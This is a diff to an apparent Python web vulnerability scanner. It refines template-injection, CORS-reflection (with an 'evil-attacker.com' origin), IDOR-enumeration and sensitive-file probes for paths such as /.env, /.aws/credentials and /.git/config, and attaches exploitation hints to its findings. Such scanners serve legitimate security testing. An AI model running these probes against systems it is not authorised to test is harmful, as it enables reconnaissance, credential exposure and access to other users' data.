-                ssti_marker = f"t{secrets.token_hex(4)}"
-                for pi in [p for p in ep["params"] if not p.get("hidden")][:1]:
-                    try:
-                        r = self._send_test(ep, pi["name"], f"{{{{{ssti_a}*{ssti_b}}}}}")
-                        if r and r.text and ssti_expected in r.text:
-                            raw = f"{ssti_a}*{ssti_b}"
-                            if raw not in r.text:
-                                ep_findings.append({
-                                    "severity": SEV_CRITICAL,
-                                    "title": f"SSTI via '{pi['name']}' at {path}",
-                                    "detail": f"Template expression evaluated: {ssti_expected}",
-                                    "evidence": f"param: {pi['name']}, {ssti_a}*{ssti_b}={ssti_expected}",
-                                    "exploitable": True,
-                                    "test_url": f"{ep['url']}?{pi['name']}={quote(f'{{{{{ssti_a}*{ssti_b}}}}}')}" if ep["method"] == "GET" else ep["url"],
-                                    "exploit_info": {"type": "ssti", "parameter": pi["name"],
-                                                     "path": path, "method": "SSTI confirmed.",
-                                                     "risk": "Remote code execution"},
-                                })
-                    except Exception:
-                        pass
+                # SSTI — use the dedicated multi-engine test (Jinja2,
+                # Freemarker, ERB, Pebble, Smarty) + template-engine
+                # error indicators. The previous inline probe only tried
+                # Jinja2/Twig syntax and didn't check for engine errors,
+                # so Freemarker/ERB/Smarty SSTI silently went undetected.
+                try:
+                    ssti = self._test_endpoint_ssti(ep)
+                    ep_findings.extend(ssti)
+                except Exception as e:
+                    integrity_log("intel", f"ssti_error:{path}:{type(e).__name__}")
 
                 # LFI
                 try:
@@ -2526,7 +2939,13 @@ class VulnScanner:
                                  "exploit_info": {"type": "csp_bypass",
                                                   "method": "Inject via eval()-reachable input.",
                                                   "risk": "Code execution via eval()"}})
-            if "'*'" in csp or "* " in csp:
+            # Match a bare '*' as a source in any directive — look for
+            # `*` bounded by whitespace, directive separator (;), or
+            # end of string. The old check was a naive '* ' substring
+            # which missed `script-src *;` (no trailing space) and
+            # 'script-src 'self' *' in some shapes, while matching an
+            # innocuous `*.example.com` inside directive values.
+            if re.search(r"(?:^|[\s;])\*(?=[\s;]|$)", csp):
                 findings.append({"severity": SEV_HIGH, "title": "CSP has wildcard source",
                                  "detail": "Wildcard allows loading scripts/styles from any origin. "
                                            "Attacker can host malicious JS on any domain.",
@@ -2539,36 +2958,79 @@ class VulnScanner:
 
         return findings
 
-    def _check_cookies(self, headers: dict) -> List[dict]:
-        """Audit Set-Cookie headers for security flags."""
+    def _check_cookies(self, headers: dict,
+                       raw_set_cookies: Optional[List[str]] = None) -> List[dict]:
+        """Audit Set-Cookie headers for security flags.
+
+        If `raw_set_cookies` is provided (a list of individual Set-Cookie
+        header values as emitted by the server), audit each one
+        independently. Otherwise fall back to the merged `headers` dict,
+        which is lossy when the server sets multiple cookies (Python's
+        `requests` joins duplicate headers with commas, so we can still
+        split them naively).
+        """
         findings = []
-        for key, val in headers.items():
-            if key.lower() != "set-cookie":
-                continue
-            cookie_name = val.split("=")[0].strip() if "=" in val else "unknown"
+        cookies_to_audit: List[str] = []
+
+        if raw_set_cookies:
+            cookies_to_audit = [c for c in raw_set_cookies if c]
+        else:
+            for key, val in headers.items():
+                if key.lower() != "set-cookie":
+                    continue
+                # Best-effort split on ", " for the merged-header case. A
+                # comma inside an Expires= date would otherwise split the
+                # date in half; use `, ` (comma + space) which matches
+                # the library's merger and is unlikely to appear inside
+                # the Expires date value (RFC 7231 uses "GMT", not a
+                # space-preceded comma).
+                for c in val.split(", "):
+                    c = c.strip()
+                    if c:
+                        cookies_to_audit.append(c)
+
+        seen_reports: Set[str] = set()
+        for val in cookies_to_audit:
+            cookie_name = val.split("=", 1)[0].strip() if "=" in val else "unknown"
             val_lower = val.lower()
 
-            if "secure" not in val_lower:
-                findings.append({"severity": SEV_MEDIUM, "title": f"Cookie '{cookie_name}' missing Secure flag",
-                                 "detail": "Cookie sent over HTTP (unencrypted), exposable via MITM.",
-                                 "evidence": f"Set-Cookie: {val[:80]}"})
-            if "httponly" not in val_lower:
-                findings.append({"severity": SEV_MEDIUM, "title": f"Cookie '{cookie_name}' missing HttpOnly flag",
-                                 "detail": "Cookie accessible via JavaScript — stealable via XSS.",
-                                 "evidence": f"Set-Cookie: {val[:80]}"})
-            if "samesite" not in val_lower:
-                findings.append({"severity": SEV_LOW, "title": f"Cookie '{cookie_name}' missing SameSite flag",
-                                 "detail": "Cookie sent on cross-site requests — CSRF risk.",
-                                 "evidence": f"Set-Cookie: {val[:80]}"})
+            for flag, sev, title_suffix, detail in (
+                ("secure", SEV_MEDIUM, "missing Secure flag",
+                 "Cookie sent over HTTP (unencrypted), exposable via MITM."),
+                ("httponly", SEV_MEDIUM, "missing HttpOnly flag",
+                 "Cookie accessible via JavaScript — stealable via XSS."),
+                ("samesite", SEV_LOW, "missing SameSite flag",
+                 "Cookie sent on cross-site requests — CSRF risk."),
+            ):
+                if flag in val_lower:
+                    continue
+                key = f"{cookie_name}:{flag}"
+                if key in seen_reports:
+                    continue
+                seen_reports.add(key)
+                findings.append({
+                    "severity": sev,
+                    "title": f"Cookie '{cookie_name}' {title_suffix}",
+                    "detail": detail,
+                    "evidence": f"Set-Cookie: {val[:80]}",
+                })
         return findings
 
     def _check_cors(self, url: str, headers: dict) -> List[dict]:
-        """Check for CORS misconfiguration."""
+        """Check for CORS misconfiguration.
+
+        Goes beyond the 'ACAO: *' and 'reflective ACAO' cases to probe:
+          - null origin trust (sandbox iframes / file:// / data:)
+          - subdomain reflection (any *.<target>)
+          - 'starts with legit domain' trust bug (legit.com.evil.com)
+          - preflight-exposed credentialed methods
+        """
         findings = []
-        acao = headers.get("Access-Control-Allow-Origin", headers.get("access-control-allow-origin", ""))
+        h_lower = {k.lower(): v for k, v in headers.items()}
+        acao = h_lower.get("access-control-allow-origin", "")
 
         if acao == "*":
-            acac = headers.get("Access-Control-Allow-Credentials", "").lower()
+            acac = h_lower.get("access-control-allow-credentials", "").lower()
             sev = SEV_HIGH if acac == "true" else SEV_MEDIUM
             findings.append({
                 "severity": sev,
@@ -2584,39 +3046,110 @@ class VulnScanner:
                                          (", authenticated session hijacking" if acac == "true" else "")},
             })
 
-        # Test reflective CORS — send Origin header and check if reflected
-        if not acao:
-            evil_origin = "https://evil-attacker.com"
-            resp = self._session.get(url, allow_wayback=False,
-                                     headers={"Origin": evil_origin})
-            if resp and resp.headers.get("Access-Control-Allow-Origin") == evil_origin:
+        # ── Reflective CORS probes ─────────────────────────────────
+        # Derive a realistic target-domain variant for probes. If the
+        # base url is https://example.com, test:
+        #   evil-attacker.com          (arbitrary reflection)
+        #   example.com.attacker.com   (bad prefix match)
+        #   subevil.example.com        (any subdomain trust)
+        #   null                       (sandboxed iframes, file://, data:)
+        target_netloc = urlparse(url).netloc.lower()
+        # Strip port if any
+        target_host = target_netloc.split(":", 1)[0]
+
+        probes = [
+            ("https://evil-attacker.com",
+             "Reflective CORS — arbitrary origin accepted",
+             "Server reflects any Origin header in ACAO.",
+             SEV_HIGH),
+            (f"https://{target_host}.evil-attacker.com",
+             "Reflective CORS — bad prefix-match trust",
+             (f"ACAO trusts any origin that starts with {target_host} "
+              f"— 'startsWith(target)' check is the classic misconfig."),
+             SEV_HIGH),
+            (f"https://evilsub.{target_host}",
+             "Reflective CORS — all-subdomains trust",
+             (f"ACAO trusts any subdomain of {target_host}. A single "
+              f"XSS / takeover on any subdomain pivots into full "
+              f"cross-origin read of this API."),
+             SEV_MEDIUM),
+            ("null",
+             "CORS trusts Origin: null",
+             ("Origin: null is produced by sandboxed iframes, "
+              "file:// origins, and data: URIs. Trusting it means "
+              "any embedded iframe can read this API with the user's "
+              "credentials."),
+             SEV_HIGH),
+        ]
+
+        for probe_origin, title, detail, sev in probes:
+            if shutdown_requested():
+                break
+            try:
+                resp = self._session.get(url, allow_wayback=False,
+                                         headers={"Origin": probe_origin})
+            except Exception:
+                continue
+            if not resp:
+                continue
+            reflected = resp.headers.get("Access-Control-Allow-Origin", "")
+            if reflected == probe_origin:
+                acac_p = resp.headers.get(
+                    "Access-Control-Allow-Credentials", "").lower()
+                with_creds = (acac_p == "true")
+                # If creds are reflected too, bump to CRITICAL.
+                eff_sev = (
+                    SEV_CRITICAL if with_creds and sev in (SEV_HIGH, SEV_MEDIUM)
+                    else sev
+                )
                 findings.append({
-                    "severity": SEV_HIGH,
-                    "title": "Reflective CORS — arbitrary origin accepted",
-                    "detail": "Server reflects any Origin header in ACAO. "
-                              "Attacker can read authenticated responses from any origin.",
-                    "evidence": f"Sent Origin: {evil_origin}, Got ACAO: {evil_origin}",
+                    "severity": eff_sev,
+                    "title": title + (" (with credentials)" if with_creds else ""),
+                    "detail": (f"{detail} "
+                               + ("ACAC=true reflected — full "
+                                  "credentialed exfil is exploitable."
+                                  if with_creds else "")),
+                    "evidence": (f"Sent Origin: {probe_origin} → "
+                                 f"ACAO: {reflected}"
+                                 f"{', ACAC: true' if with_creds else ''}"),
                     "exploitable": True,
-                    "exploit_info": {"type": "cors_misconfiguration",
-                                     "method": "Send requests from attacker.com with credentials. "
-                                               "Server reflects attacker origin in ACAO, "
-                                               "allowing cross-origin data theft.",
-                                     "risk": "Authenticated data theft, API abuse"},
+                    "exploit_info": {
+                        "type": "cors_misconfiguration",
+                        "method": (f"Attacker page with Origin: "
+                                   f"{probe_origin} can fetch this "
+                                   f"endpoint" +
+                                   (" with the victim's cookies"
+                                    if with_creds else "") +
+                                   " and read the body."),
+                        "risk": ("Authenticated data theft, API abuse"
+                                 if with_creds
+                                 else "Cross-origin data theft"),
+                    },
                 })
+                # Only emit the first positive — don't pile them on
+                # every probe.
+                break
         return findings
 
     def _check_info_disclosure(self, headers: dict, html: str) -> List[dict]:
-        """Check for information disclosure in headers and HTML."""
+        """Check for information disclosure in headers and HTML.
+
+        HTTP header names are case-insensitive (RFC 9110 §5.1), but
+        plain-dict lookups are not. Build a lower-keyed snapshot so a
+        server emitting 'server:' instead of 'Server:' doesn't silently
+        slip past these checks.
+        """
         findings = []
+        h_lower = {k.lower(): v for k, v in headers.items()}
 
         # Server version strings
-        server = headers.get("Server", "")
+        server = h_lower.get("server", "")
         if server and re.search(r"\d+\.\d+", server):
             findings.append({"severity": SEV_LOW, "title": "Server version disclosed",
                              "detail": f"Server header reveals version info. Aids attacker reconnaissance.",
                              "evidence": f"Server: {server[:80]}"})
 
-        powered = headers.get("X-Powered-By", "")
+        powered = h_lower.get("x-powered-by", "")
         if powered:
             findings.append({"severity": SEV_LOW, "title": "X-Powered-By header present",
                              "detail": "Technology stack revealed. Remove this header.",
@@ -2624,7 +3157,7 @@ class VulnScanner:
 
         # Debug headers
         for debug_h in ["X-Debug-Token", "X-Debug-Info", "X-Debug-Link"]:
-            if debug_h in headers or debug_h.lower() in {k.lower() for k in headers}:
+            if debug_h.lower() in h_lower:
                 findings.append({"severity": SEV_HIGH, "title": f"Debug header present: {debug_h}",
                                  "detail": "Debug mode likely enabled in production.",
                                  "evidence": f"{debug_h} header found"})
@@ -2652,7 +3185,9 @@ class VulnScanner:
         xfo = h.get("x-frame-options", "")
         csp = h.get("content-security-policy", "")
 
-        if not xfo and "frame-ancestors" not in csp:
+        # CSP directive names are case-insensitive per spec; the literal
+        # substring check previously only matched lowercase.
+        if not xfo and "frame-ancestors" not in csp.lower():
             return [{"severity": SEV_MEDIUM, "title": "Clickjacking possible",
                      "detail": "No X-Frame-Options or CSP frame-ancestors. "
                                "Page can be embedded in attacker-controlled iframes to "
@@ -2719,8 +3254,16 @@ class VulnScanner:
         if not id_params:
             return findings
 
-        # Test: can we access id+1 and id-1? If responses differ meaningfully
-        # and both return 200, IDOR is likely
+        # Test: compare baseline to id+1 AND id-1. Both need to return
+        # 200 with DIFFERENT content from the baseline for a real IDOR
+        # signal (otherwise it's likely the same page regardless of ID).
+        # Login-wall responses are filtered: status==200 + a denial phrase
+        # is skipped.
+        _idor_deny = re.compile(
+            r"(?:access\s+denied|permission\s+denied|unauthori[sz]ed|"
+            r"please\s+(?:log|sign)\s+in|login\s+required)",
+            re.I,
+        )
         tested = set()
         for param_name, param_val in id_params[:3]:
             key = f"{param_name}:{param_val}"
@@ -2732,62 +3275,231 @@ class VulnScanner:
             except ValueError:
                 continue
 
-            # Fetch original
             orig_url = f"{base_url}?{param_name}={val}"
             orig_resp = self._session.get(orig_url, allow_wayback=False)
-            if not orig_resp or orig_resp.status_code != 200:
+            if not orig_resp or orig_resp.status_code != 200 or not orig_resp.text:
+                continue
+            if _idor_deny.search(orig_resp.text[:4000]):
                 continue
 
-            # Fetch id+1
-            next_url = f"{base_url}?{param_name}={val + 1}"
-            next_resp = self._session.get(next_url, allow_wayback=False)
-            if next_resp and next_resp.status_code == 200 and next_resp.text:
-                diff = self._response_diff(orig_resp.text, next_resp.text)
+            hits: List[Tuple[int, float]] = []
+            for offset in (1, -1, 2, 10):
+                target_id = val + offset
+                if target_id <= 0:
+                    continue
+                t_url = f"{base_url}?{param_name}={target_id}"
+                t_resp = self._session.get(t_url, allow_wayback=False)
+                if not t_resp or t_resp.status_code != 200 or not t_resp.text:
+                    continue
+                if _idor_deny.search(t_resp.text[:4000]):
+                    continue
+                diff = self._response_diff(orig_resp.text, t_resp.text)
                 if not diff["similar"] and diff["score"] > 0.3:
-                    findings.append({
-                        "severity": SEV_HIGH,
-                        "title": f"Possible IDOR via '{param_name}' parameter",
-                        "detail": f"Sequential IDs ({val}, {val+1}) return different content. "
-                                  "Access control may not be enforced — test with different sessions.",
-                        "evidence": f"param: {param_name}, id={val} and id={val+1} both return 200 "
-                                    f"with different content (similarity={diff['score']})",
-                        "exploitable": True,
-                        "exploit_info": {
-                            "type": "idor",
-                            "parameter": param_name,
-                            "method": f"Enumerate '{param_name}' values (1, 2, 3...) to access "
-                                      "other users' data. Test with unauthenticated session.",
-                            "risk": "Unauthorized data access, privacy violation, data theft",
-                        },
-                    })
-                    break
+                    hits.append((target_id, diff["score"]))
+
+            # Require at least TWO distinct IDs to return different-but-
+            # similar content before flagging. One off-by-one could be
+            # coincidence; two is a pattern.
+            if len(hits) >= 2:
+                ids_s = ", ".join(str(h[0]) for h in hits)
+                findings.append({
+                    "severity": SEV_HIGH,
+                    "title": f"Possible IDOR via '{param_name}' parameter",
+                    "detail": (f"Sequential IDs return different content "
+                               f"(baseline={val}, other IDs: {ids_s}). "
+                               f"Access control appears absent — test "
+                               f"with an unauthenticated session to "
+                               f"confirm."),
+                    "evidence": (f"param: {param_name}, baseline={val}, "
+                                 f"others={ids_s} — all return 200 with "
+                                 f"different bodies"),
+                    "exploitable": True,
+                    "exploit_info": {
+                        "type": "idor",
+                        "parameter": param_name,
+                        "method": (f"Enumerate '{param_name}' (for/while "
+                                   f"range) to access other users' data. "
+                                   f"Also test with your session cookie "
+                                   f"removed — if IDs still return data, "
+                                   f"there's no auth check."),
+                        "risk": "Unauthorized data access, privacy violation, data theft",
+                    },
+                })
+                break
         return findings
+
+    # Per-path content validators: given a path and the response body,
+    # returns True iff the body looks like the real artefact (not a
+    # soft-404 or login-wall). Only paths where blind HTTP-200 is
+    # noisy need a validator here.
+    _PATH_CONTENT_VALIDATORS = {
+        "/.git/HEAD": lambda b: "ref:" in b[:100] or _re_hex40.match(b.strip()),
+        "/.git/config": lambda b: "[core]" in b[:200] or "[remote" in b[:200],
+        "/.git/logs/HEAD": lambda b: _re_git_log.search(b[:500]) is not None,
+        "/.svn/entries": lambda b: b.strip()[:4].isdigit() or "<?xml" in b[:100],
+        # SQLite's magic bytes are "SQLite format 3\0"; once decoded
+        # as text the NUL survives, but we only check the printable
+        # prefix to stay resilient to charset coercion.
+        "/.svn/wc.db": lambda b: "SQLite format 3" in b[:32],
+        "/.env": lambda b: _re_env_line.search(b[:2000]) is not None,
+        "/.env.local": lambda b: _re_env_line.search(b[:2000]) is not None,
+        "/.env.production": lambda b: _re_env_line.search(b[:2000]) is not None,
+        "/.env.development": lambda b: _re_env_line.search(b[:2000]) is not None,
+        "/.env.backup": lambda b: _re_env_line.search(b[:2000]) is not None,
+        "/.env.bak": lambda b: _re_env_line.search(b[:2000]) is not None,
+        "/.htpasswd": lambda b: ":" in b[:200] and _re_htpasswd.search(b[:2000]) is not None,
+        "/phpinfo.php": lambda b: "phpinfo()" in b[:5000] or "PHP Version" in b[:5000],
+        "/info.php": lambda b: "phpinfo()" in b[:5000] or "PHP Version" in b[:5000],
+        "/server-status": lambda b: "Apache Server Status" in b[:500] or "Total accesses" in b[:500],
+        "/server-info": lambda b: "Apache Server Information" in b[:500],
+        "/nginx_status": lambda b: b.strip().startswith("Active connections:"),
+        "/stub_status": lambda b: b.strip().startswith("Active connections:"),
+        "/swagger.json": lambda b: '"swagger"' in b[:200] or '"openapi"' in b[:200],
+        "/openapi.json": lambda b: '"openapi"' in b[:200] or '"swagger"' in b[:200],
+        "/v2/api-docs": lambda b: '"swagger"' in b[:200] or '"openapi"' in b[:200],
+        "/v3/api-docs": lambda b: '"openapi"' in b[:200],
+        "/api-docs": lambda b: '"swagger"' in b[:200] or '"openapi"' in b[:200],
+        "/graphql": lambda b: "__schema" in b[:2000] or '"errors"' in b[:200] or "Must provide query" in b[:200],
+        "/graphiql": lambda b: "graphiql" in b[:5000].lower(),
+        "/graphql-playground": lambda b: "playground" in b[:5000].lower() and "graphql" in b[:5000].lower(),
+        "/actuator": lambda b: '"_links"' in b[:500],
+        "/actuator/env": lambda b: '"propertySources"' in b[:500] or '"activeProfiles"' in b[:500],
+        "/actuator/mappings": lambda b: '"mappings"' in b[:500] or '"contexts"' in b[:500],
+        "/actuator/beans": lambda b: '"beans"' in b[:500],
+        "/actuator/info": lambda b: b.strip().startswith("{") and len(b) > 5,
+        # HPROF heap dumps start with 'JAVA PROFILE 1.0.1\0' (or .2).
+        # Gzipped dumps start with gzip magic \x1f\x8b; once text-
+        # decoded that becomes two ASCII bytes we can pin via
+        # chr() to avoid literal control chars in source.
+        "/actuator/heapdump": lambda b: (
+            "JAVA PROFILE" in b[:32]
+            or b[:2] == "\x1f\x8b"
+        ),
+        "/actuator/httptrace": lambda b: '"traces"' in b[:500],
+        "/actuator/trace": lambda b: '"traces"' in b[:500] or b.strip().startswith("["),
+        "/actuator/loggers": lambda b: '"loggers"' in b[:500],
+        "/actuator/configprops": lambda b: '"contexts"' in b[:500],
+        "/actuator/threaddump": lambda b: '"threads"' in b[:500],
+        "/jolokia/": lambda b: '"status"' in b[:200] and '"request"' in b[:500],
+        "/xmlrpc.php": lambda b: "XML-RPC server accepts POST" in b[:200],
+        "/.htaccess": lambda b: (
+            "RewriteEngine" in b[:500] or "AuthType" in b[:500]
+            or "Order " in b[:200] or "Allow " in b[:200]
+            or "Require " in b[:200]
+        ),
+        "/robots.txt": lambda b: "user-agent" in b[:500].lower(),
+        "/sitemap.xml": lambda b: "<urlset" in b[:500] or "<sitemapindex" in b[:500],
+        "/sitemap_index.xml": lambda b: "<sitemapindex" in b[:500],
+        "/.well-known/security.txt": lambda b: "contact:" in b[:500].lower(),
+        "/.well-known/openid-configuration": lambda b: '"issuer"' in b[:500],
+        "/.well-known/oauth-authorization-server": lambda b: '"issuer"' in b[:500],
+        "/crossdomain.xml": lambda b: "<cross-domain-policy" in b[:500],
+        "/wp-json/wp/v2/users": lambda b: b.strip().startswith("[") and ('"id":' in b[:500] or '"slug":' in b[:500]),
+        "/wp-login.php": lambda b: "wp-login" in b[:3000].lower() or "loginform" in b[:3000].lower(),
+        "/readme.html": lambda b: "WordPress" in b[:500],
+        "/elmah.axd": lambda b: "Error Log" in b[:500] or "ELMAH" in b[:500],
+        "/trace.axd": lambda b: "Application Trace" in b[:500] or "Trace.axd" in b[:200],
+        "/console": lambda b: (
+            "werkzeug" in b[:2000].lower()
+            or "rails" in b[:2000].lower()
+            or "console" in b[:500].lower() and "debug" in b[:500].lower()
+        ),
+        "/WEB-INF/web.xml": lambda b: "<web-app" in b[:500] or "<servlet" in b[:1000],
+        "/.aws/credentials": lambda b: "[default]" in b[:200] or "aws_access_key_id" in b[:500],
+        "/backup.sql": lambda b: (
+            "INSERT INTO" in b[:4000] or "CREATE TABLE" in b[:2000]
+            or "-- MySQL dump" in b[:200] or "-- PostgreSQL database dump" in b[:200]
+        ),
+        "/db.sql": lambda b: (
+            "INSERT INTO" in b[:4000] or "CREATE TABLE" in b[:2000]
+            or "-- MySQL dump" in b[:200]
+        ),
+        "/dump.sql": lambda b: (
+            "INSERT INTO" in b[:4000] or "CREATE TABLE" in b[:2000]
+        ),
+        "/package.json": lambda b: '"dependencies"' in b[:2000] or '"name"' in b[:200],
+        "/package-lock.json": lambda b: '"lockfileVersion"' in b[:500],
+        "/yarn.lock": lambda b: "# yarn lockfile" in b[:200] or b.lstrip().startswith("# THIS IS"),
+        "/requirements.txt": lambda b: _re_requirements.search(b[:1000]) is not None,
+        "/composer.json": lambda b: '"require"' in b[:1000] or '"name"' in b[:200],
+        "/composer.lock": lambda b: '"packages"' in b[:2000],
+        "/Dockerfile": lambda b: _re_dockerfile.search(b[:500]) is not None,
+        "/docker-compose.yml": lambda b: "version:" in b[:200] or "services:" in b[:200],
+        "/docker-compose.yaml": lambda b: "version:" in b[:200] or "services:" in b[:200],
+        "/kubernetes.yaml": lambda b: "apiVersion:" in b[:200] and "kind:" in b[:500],
+        "/.gitlab-ci.yml": lambda b: "stages:" in b[:500] or "script:" in b[:1000],
+        "/.travis.yml": lambda b: "language:" in b[:500] or "script:" in b[:1000],
+    }
+
+    # What HTTP statuses prove a path EXISTS on this server (not blanket 200).
+    # A few specific high-value endpoints (like actuator/env) typically
+    # answer 401/403 when protected — still a finding because the
+    # endpoint exists and protection is the only thing between the
+    # attacker and it.
+    _AUTH_WALL_EXISTS = frozenset((
+        "/actuator", "/actuator/env", "/actuator/heapdump",
+        "/actuator/mappings", "/actuator/trace", "/actuator/httptrace",
+        "/actuator/loggers", "/actuator/beans", "/actuator/configprops",
+        "/actuator/threaddump", "/actuator/info",
+        "/manage", "/jolokia/",
+        "/server-status", "/server-info", "/nginx_status", "/stub_status",
+        "/elmah.axd", "/trace.axd",
+        "/_debugbar/", "/__debug__/",
+    ))
 
     def _check_sensitive_paths(self, base_url: str) -> List[dict]:
         """Probe for exposed sensitive files and directories.
 
-        Uses domain circuit breaker — if the site is actively blocking us,
-        stops probing after BLOCK_THRESHOLD failures instead of trying all 26 paths.
-
-        Soft-404 detection: many sites return HTTP 200 for nonexistent paths
-        with a generic "not found" page. We first fetch a known-nonexistent path
-        to get the baseline 404 page length, then compare against it.
+        Two-pass: HEAD first, GET only on promising responses. Soft-404
+        and per-path content validation filter out the mountain of false
+        positives we'd get from a blind "HTTP 200 = vuln" rule on a
+        site that wildcards everything to a SPA shell.
         """
         findings = []
         domain = urlparse(base_url).netloc
         total = len(self.SENSITIVE_PATHS)
         skipped = 0
+        hits = 0
 
-        # Soft-404 baseline: fetch a random path that definitely doesn't exist
+        # Soft-404 baseline — hash the 'this path does not exist' body so
+        # we can detect template-identical soft-404s even when their
+        # length jitters by a few bytes.
         _baseline_url = urljoin(base_url, f"/gs_nonexistent_{secrets.token_hex(4)}")
         _baseline_resp = self._session.get(_baseline_url, allow_wayback=False, method="GET")
-        _soft404_length = len(_baseline_resp.text) if _baseline_resp and _baseline_resp.status_code == 200 else -1
+        if _baseline_resp and _baseline_resp.status_code == 200 and _baseline_resp.text:
+            _baseline_body = _baseline_resp.text
+            _soft404_length = len(_baseline_body)
+            # Hash the first ~4KB so tiny dynamic bits (timestamps, CSRF
+            # tokens) don't ruin the comparison.
+            _soft404_head = hashlib.sha256(_baseline_body[:4096].encode("utf-8", "ignore")).hexdigest()
+        else:
+            _soft404_length = -1
+            _soft404_head = None
         _soft404_patterns = re.compile(
-            r"not\s*found|404|page\s*(does\s*not|doesn.t)\s*exist|no\s*such\s*page|"
+            r"not\s*found|page\s*(?:does\s*not|doesn.t)\s*exist|no\s*such\s*page|"
             r"this\s*page\s*could\s*not|we\s*couldn.t\s*find|error\s*404",
             re.I
         )
 
+        def _looks_like_soft_404(body: str) -> bool:
+            if not body:
+                return False
+            if _soft404_length > 0 and abs(len(body) - _soft404_length) < 200:
+                # Confirm template match via head hash
+                head_hash = hashlib.sha256(body[:4096].encode("utf-8", "ignore")).hexdigest()
+                if _soft404_head == head_hash:
+                    return True
+                # Close in length AND the body says "not found" → soft-404
+                if _soft404_patterns.search(body[:1500]):
+                    return True
+            if _soft404_patterns.search(body[:1500]) and len(body) < 3000:
+                return True
+            return False
+
+        # Inline progress for a long probe list. Without this the
+        # operator stares at a blank terminal for minutes while the
+        # scan churns through 90 HEAD requests.
+        _last_progress = 0
         for idx, (path, title, severity, detail) in enumerate(self.SENSITIVE_PATHS):
             if shutdown_requested():
                 break
@@ -2795,42 +3507,86 @@ class VulnScanner:
                 skipped = total - idx
                 break
 
+            # Tick progress every 15 probes.
+            if idx - _last_progress >= 15:
+                print(f" [{idx}/{total}]", end="", flush=True)
+                _last_progress = idx
+
             url = urljoin(base_url, path)
             resp = self._session.get(url, allow_wayback=False, method="HEAD")
-            if resp and resp.status_code == 200:
-                if severity in (SEV_CRITICAL, SEV_HIGH):
-                    resp_full = self._session.get(url, allow_wayback=False)
-                    if resp_full and resp_full.status_code == 200 and len(resp_full.text) > 10:
-                        body = resp_full.text
-                        # Soft-404 check: skip if body matches baseline or has 404 patterns
-                        if _soft404_length > 0 and abs(len(body) - _soft404_length) < 100:
+            if not resp:
+                continue
+
+            status = resp.status_code
+            # "Auth wall exists" is itself a finding for a small set of
+            # endpoints where the fact that /actuator/env answers at all
+            # (even with 401) means the endpoint is mounted.
+            auth_wall_hit = (
+                status in (401, 403)
+                and path in self._AUTH_WALL_EXISTS
+            )
+            if status == 200 or auth_wall_hit:
+                if auth_wall_hit:
+                    findings.append({
+                        "severity": severity,
+                        "title": f"{title} (auth-walled)",
+                        "detail": (f"{detail} — endpoint exists at {path} but "
+                                   f"returns HTTP {status}. Test with "
+                                   f"default creds / bearer tokens / the "
+                                   f"Actuator default port (8081)."),
+                        "evidence": f"HTTP {status} at {path}",
+                        "path": path,
+                        "exploitable": severity in (SEV_CRITICAL, SEV_HIGH),
+                        "exploit_info": {
+                            "type": "auth_walled_endpoint",
+                            "path": path,
+                            "method": (f"Endpoint {path} is mounted but "
+                                       f"requires auth. Try default creds, "
+                                       f"JWT leaks, or direct access "
+                                       f"from inside the network."),
+                            "risk": "Information disclosure if auth weak",
+                        } if severity in (SEV_CRITICAL, SEV_HIGH) else {},
+                    })
+                    hits += 1
+                    continue
+
+                # HTTP 200: verify content to avoid soft-404 false positives.
+                resp_full = self._session.get(url, allow_wayback=False)
+                if not resp_full or resp_full.status_code != 200:
+                    continue
+                body = resp_full.text or ""
+                if len(body) < 2 and path not in ("/.git/HEAD", "/.env"):
+                    continue
+
+                if _looks_like_soft_404(body):
+                    continue
+
+                validator = self._PATH_CONTENT_VALIDATORS.get(path)
+                if validator is not None:
+                    try:
+                        if not validator(body):
                             continue
-                        if _soft404_patterns.search(body[:1000]):
-                            continue
-                        # For git/env, verify content looks real
-                        if path == "/.git/HEAD" and "ref:" not in body[:100]:
-                            continue
-                        if path == "/.env" and "=" not in body[:500]:
-                            continue
-                        findings.append({"severity": severity, "title": title,
-                                         "detail": detail, "evidence": f"HTTP 200 at {path}",
-                                         "path": path, "content_length": len(body)})
-                else:
-                    # For INFO/LOW/MEDIUM: check for soft-404 to avoid false positives
-                    # on sites that return 200 with generic pages for every path
-                    if severity in (SEV_INFO, SEV_LOW, SEV_MEDIUM) and _soft404_length > 0:
-                        resp_check = self._session.get(url, allow_wayback=False)
-                        if resp_check:
-                            if abs(len(resp_check.text) - _soft404_length) < 100:
-                                continue
-                            if _soft404_patterns.search(resp_check.text[:1000]):
-                                continue
-                    findings.append({"severity": severity, "title": title,
-                                     "detail": detail, "evidence": f"HTTP 200 at {path}",
-                                     "path": path})
+                    except Exception:
+                        continue
+                elif severity in (SEV_CRITICAL, SEV_HIGH):
+                    # No validator + high-severity = be conservative:
+                    # require the body NOT be an HTML shell (SPAs serve
+                    # the same index.html for every path).
+                    low_head = body[:256].lstrip().lower()
+                    if low_head.startswith("<!doctype html") or low_head.startswith("<html"):
+                        continue
+
+                findings.append({
+                    "severity": severity, "title": title,
+                    "detail": detail, "evidence": f"HTTP 200 at {path}",
+                    "path": path, "content_length": len(body),
+                })
+                hits += 1
 
         if skipped:
             print(f"        (skipped {skipped} paths — site is blocking probes)")
+        if hits:
+            print(f"        (confirmed {hits}/{total - skipped} sensitive path(s))")
         return findings
 
     def _check_http_methods(self, base_url: str) -> List[dict]:
@@ -2841,12 +3597,13 @@ class VulnScanner:
             return findings
 
         try:
-            self._session._delay_for_domain(domain)
-            self._session._maybe_rotate_circuit()
-            opt_resp = self._session._session.options(base_url, timeout=REQUEST_TIMEOUT,
-                                                       proxies=self._session._proxy,
-                                                       headers=_pick_profile())
-            if opt_resp and opt_resp.status_code == 200:
+            opt_resp = self._session.request("OPTIONS", base_url)
+            # Servers commonly advertise Allow: from OPTIONS with status
+            # 200 OR 204 (No Content). requiring 200 specifically misses
+            # every correctly-implemented RFC-7231 server that returns
+            # 204. Look at Allow whenever the response exists and the
+            # status isn't a hard error.
+            if opt_resp and opt_resp.status_code < 400:
                 allow = opt_resp.headers.get("Allow", "")
                 if allow:
                     dangerous = {"PUT", "DELETE", "TRACE", "PATCH"}
@@ -2878,11 +3635,8 @@ class VulnScanner:
                 break
             test_url = f"{base_url}?{param}={quote(evil_target)}"
             try:
-                self._session._delay_for_domain(domain)
-                self._session._maybe_rotate_circuit()
-                resp = self._session._session.get(
-                    test_url, timeout=REQUEST_TIMEOUT, allow_redirects=False,
-                    proxies=self._session._proxy, headers=_pick_profile()
+                resp = self._session.request(
+                    "GET", test_url, allow_redirects=False,
                 )
                 if resp and resp.status_code in (301, 302, 303, 307, 308):
